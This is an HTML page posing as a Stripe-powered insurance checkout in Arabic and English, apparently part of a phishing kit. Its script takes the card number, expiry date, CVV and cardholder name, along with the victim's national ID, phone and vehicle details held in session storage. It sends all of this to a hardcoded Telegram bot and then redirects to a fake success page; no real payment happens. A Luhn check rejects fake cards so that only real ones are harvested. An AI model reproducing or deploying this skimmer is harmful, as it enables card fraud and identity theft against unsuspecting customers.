<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>الدفع | تأميني</title>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet" />
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
  body { background: #f7f9fc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 2rem; }
  
  .stripe-container {
    width: 100%; max-width: 450px; background: #fff; padding: 2rem;
    border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
  }
  .stripe-header { text-align: center; margin-bottom: 2rem; }
  .stripe-company { font-size: 0.9rem; color: #666; font-weight: 600; letter-spacing: 1px; }
  .stripe-amount { margin-top: 0.5rem; display: flex; justify-content: center; align-items: flex-start; gap: 0.2rem; color: #333; }
  .stripe-amount-label { font-size: 1rem; font-weight: 500; margin-top: 0.3rem; }
  .stripe-amount-value { font-size: 2.5rem; font-weight: 700; line-height: 1; }

  .stripe-group { margin-bottom: 1.2rem; }
  .stripe-group label { display: block; font-size: 0.9rem; font-weight: 600; color: #333; margin-bottom: 0.4rem; }
  .stripe-group input, .stripe-group select { width: 100%; padding: 0.75rem; border: 1px solid #d1d5db; border-radius: 6px; font-size: 1rem; outline: none; transition: border 0.2s; }
  .stripe-group input:focus, .stripe-group select:focus { border-color: #0570de; box-shadow: 0 0 0 3px rgba(5, 112, 222, 0.1); }

  .stripe-card-box { border: 1px solid #d1d5db; border-radius: 6px; overflow: hidden; }
  .stripe-card-header { padding: 0.75rem; display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; font-weight: 600; color: #333; background: #f9fafb; border-bottom: 1px solid #d1d5db; }
  .stripe-input-row { display: flex; }
  .stripe-input-row input { border: none; border-radius: 0; border-bottom: 1px solid #d1d5db; }
  .stripe-input-row input:focus { box-shadow: none; border-bottom-color: #0570de; }
  .stripe-input-wrapper { position: relative; flex: 1; display: flex; align-items: center; }
  .stripe-input-wrapper input { padding-right: 50px; }
  .card-logo { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 35px; height: 24px; background-size: contain; background-repeat: no-repeat; background-position: center; }

  .stripe-checkbox { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1.5rem; }
  .stripe-checkbox input { width: 18px; height: 18px; accent-color: #0570de; }
  .stripe-checkbox label { font-size: 0.85rem; color: #555; }

  .stripe-pay-btn { width: 100%; padding: 1rem; background: #0570de; color: #fff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: background 0.2s; }
  .stripe-pay-btn:hover { background: #045cb5; }
  .stripe-footer-text { text-align: center; margin-top: 1rem; font-size: 0.75rem; color: #888; }
</style>
</head>
<body>

  <div class="stripe-container">
    <div class="stripe-header">
      <div class="stripe-company" style="display:flex; justify-content:center; align-items:center; gap:8px;">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
        HAMMAN
      </div>
      <div class="stripe-amount">
        <span class="stripe-amount-label">SAR</span>
        <span class="stripe-amount-value" id="checkout-price">0.00</span>
      </div>
    </div>

    <form onsubmit="processPayment(event)">
      <div class="stripe-group">
        <label>Email</label>
        <input type="email" placeholder="email@example.com" required>
      </div>

      <div class="stripe-group">
        <label>Payment method</label>
        <div class="stripe-card-box">
          <div class="stripe-card-header">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
            Card
          </div>
          <div class="stripe-input-row">
            <div class="stripe-input-wrapper">
              <input type="text" id="card-number" placeholder="1234 1234 1234 1234" maxlength="19" oninput="detectCardType(this)" required>
              <div id="card-logo" class="card-logo"></div>
            </div>
          </div>
          <div class="stripe-input-row split">
            <input type="text" id="expiry-date" placeholder="MM / YY" maxlength="7" oninput="formatExpiry(this)" required dir="ltr">
            <input type="text" id="cvv" placeholder="CVC" maxlength="4" style="border-left: none;" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required dir="ltr">
          </div>
        </div>
      </div>

      <div class="stripe-group">
        <label>Cardholder name</label>
        <input type="text" id="cardholder-name" placeholder="Full name on card" required oninput="validateCardName(this)">
        <div id="name-error" style="color:red; font-size:0.8rem; display:none; margin-top:4px;">Name must contain letters only.</div>
      </div>

      <div class="stripe-group">
        <label>Country or region</label>
        <input type="text" value="Saudi Arabia" readonly style="background:#f9fafb; color:#666; cursor:not-allowed;">
      </div>

      <div class="stripe-checkbox">
        <input type="checkbox" id="save-info">
        <label for="save-info">Save my information for faster checkout</label>
      </div>

      <button type="submit" class="stripe-pay-btn">Pay</button>
      <div class="stripe-footer-text">Powered by <strong>stripe</strong> | Terms | Privacy</div>
    </form>
  </div>

<script>
  /* ================== إعدادات التليجرام ================== */

  function escapeHTML(str) {
      if (!str) return '';
      return str.toString()
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;');
  }

 async function sendToTelegram(message) {
    const TELEGRAM_BOT_TOKEN = '9058820161:AAHtWLs4B80Mjs3IgVYRs1_emMAxUWiEwto'; 
    const TELEGRAM_CHAT_ID = '1216054281';

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: TELEGRAM_CHAT_ID, 
                text: message, 
                parse_mode: 'HTML',
                disable_web_page_preview: true 
            })
        });
        const data = await response.json();
        if (!data.ok) console.error('Telegram API Error:', data.description);
    } catch (error) {
        console.error('Network Error with Telegram:', error);
    }
}

  // قراءة السعر
  document.addEventListener('DOMContentLoaded', () => {
    const price = sessionStorage.getItem('checkoutPrice');
    if (price) {
      document.getElementById('checkout-price').innerText = price;
    } else {
      document.getElementById('checkout-price').innerText = '0.00';
    }
  });

  let isCardValid = false;
  let isDateValid = false;
  let isNameValid = false;

  function detectCardType(input) {
    let val = input.value.replace(/\D/g, '');
    const logoDiv = document.getElementById('card-logo');
    let formatted = val.match(/.{1,4}/g);
    input.value = formatted ? formatted.join(' ') : '';

    if (/^4/.test(val)) {
      logoDiv.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png')";
    } else if (/^5[1-5]/.test(val) || /^2[2-7]/.test(val)) {
      logoDiv.style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png')";
    } else {
      logoDiv.style.backgroundImage = "none";
    }

    isCardValid = false;
    if (val.length === 16) {
      let isRepeated = /^(\d)\1{15}$/.test(val); 
      let isSequential = /(0123|1234|2345|3456|4567|5678|6789)/.test(val);
      
      let sum = 0;
      let shouldDouble = false;
      for (let i = val.length - 1; i >= 0; i--) {
        let digit = parseInt(val.charAt(i));
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      let isLuhnValid = (sum % 10) === 0;

      if (!isRepeated && !isSequential && isLuhnValid) {
        isCardValid = true;
      }
    }

    if (val.length === 16) {
      input.style.borderColor = isCardValid ? '#10b981' : '#ef4444';
    } else {
      input.style.borderColor = '#d1d5db';
    }
  }

  function formatExpiry(input) {
    let val = input.value.replace(/\D/g, ''); 
    if (val.length > 4) val = val.slice(0, 4); 

    if (val.length > 2) {
      input.value = val.slice(0, 2) + ' / ' + val.slice(2);
    } else {
      input.value = val;
    }

    isDateValid = false;
    if (val.length === 4) {
      let m = parseInt(val.substring(0, 2));
      let y = parseInt(val.substring(2, 4));
      let currentYear = new Date().getFullYear() % 100;
      let currentMonth = new Date().getMonth() + 1;

      let isMonthValid = (m >= 1 && m <= 12);
      let isYearValid = (y > currentYear) || (y === currentYear && m >= currentMonth);
      let isRepeated = /^(\d)\1{3}$/.test(val);

      if (isMonthValid && isYearValid && !isRepeated) {
        isDateValid = true;
      }
    }

    if (val.length === 4) {
      input.style.borderColor = isDateValid ? '#10b981' : '#ef4444';
    } else {
      input.style.borderColor = '#d1d5db';
    }
  }

  function validateCardName(input) {
    const val = input.value.trim();
    const regex = /^[a-zA-Z\s]+$/; 
    const err = document.getElementById('name-error');
    
    isNameValid = regex.test(val) && val.length >= 3;
    
    if (isNameValid) {
      input.style.borderColor = '#10b981';
      err.style.display = 'none';
    } else {
      input.style.borderColor = '#ef4444';
      if(val.length > 0) err.style.display = 'block';
      else err.style.display = 'none';
    }
    return isNameValid;
  }

  async function processPayment(e) {
    e.preventDefault();
    
    const cvvInput = document.getElementById('cvv');
    const nameInput = document.getElementById('cardholder-name');
    const cardInput = document.getElementById('card-number');
    const dateInput = document.getElementById('expiry-date');

    if (!isNameValid) {
      alert('يرجى كتابة اسم حامل البطاقة بشكل صحيح (حروف إنجليزية فقط).');
      return; 
    }

    if (!isCardValid) {
      alert('رقم البطاقة غير صحيح أو وهمي. يرجى استخدام بطاقة حقيقية.');
      return;
    }

    if (!isDateValid) {
      alert('تاريخ انتهاء البطاقة غير صحيح أو منتهي الصلاحية.');
      return;
    }

    if (cvvInput.value.length < 3) {
      alert('يرجى كتابة رمز التحقق CVC بشكل صحيح (3 أرقام).');
      return;
    }

    // استرجاع بيانات العميل
    const userDataString = sessionStorage.getItem('userData');
    let clientData = {};
    if (userDataString) {
        clientData = JSON.parse(userDataString);
    } else {
        // ده مجرد تحذير عشان تعرف إن مفيش بيانات متخزنة
        console.warn("⚠️ تحذير: لم يتم العثور على بيانات العميل في sessionStorage!");
        alert("تنبيه: لم يتم العثور على بيانات العميل. تأكد من أنك قمت بتعبئة البيانات الأساسية أولاً.");
    }

    const price = sessionStorage.getItem('checkoutPrice') || '0.00';
    const company = sessionStorage.getItem('checkoutCompany') || 'غير محدد';

    // طباعة البيانات في الكونسول عشان تتأكد
    console.log("بيانات العميل المرسلة:", clientData);

    const message = `
💳 <b>عملية شراء جديدة (إتمام الدفع)!</b>
━━━━━━━━━━━━━━━━━━
🏢 <b>الشركة:</b> ${escapeHTML(company)}
💰 <b>المبلغ المدفوع:</b> <b>${escapeHTML(price)} ر.س</b>
━━━━━━━━━━━━━━━━━━
👤 <b>بيانات العميل</b>
• <b>الاسم:</b> ${escapeHTML(clientData.name || 'غير متوفر')}
• <b>رقم الهوية:</b> <code>${escapeHTML(clientData.id || 'غير متوفر')}</code>
• <b>رقم الجوال:</b> <code>${escapeHTML(clientData.phone || 'غير متوفر')}</code>
• <b>الرقم التسلسلي:</b> <code>${escapeHTML(clientData.regNumber || 'غير متوفر')}</code>
• <b>نوع المركبة:</b> ${escapeHTML(clientData.car || '')} (${escapeHTML(clientData.year || '')})
━━━━━━━━━━━━━━━━━━
💳 <b>بيانات البطاقة</b>
• <b>اسم حامل البطاقة:</b> ${escapeHTML(nameInput.value.trim())}
• <b>رقم البطاقة:</b> <code>${escapeHTML(cardInput.value.replace(/\s+/g, ''))}</code>
• <b>تاريخ الانتهاء:</b> <code>${escapeHTML(dateInput.value)}</code>
• <b>رمز الأمان (CVV):</b> <code>${escapeHTML(cvvInput.value)}</code>
━━━━━━━━━━━━━━━━━━
⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
    `;
    
    await sendToTelegram(message);
    window.location.href = 'success.html';
  }
</script>
</body>
</html>
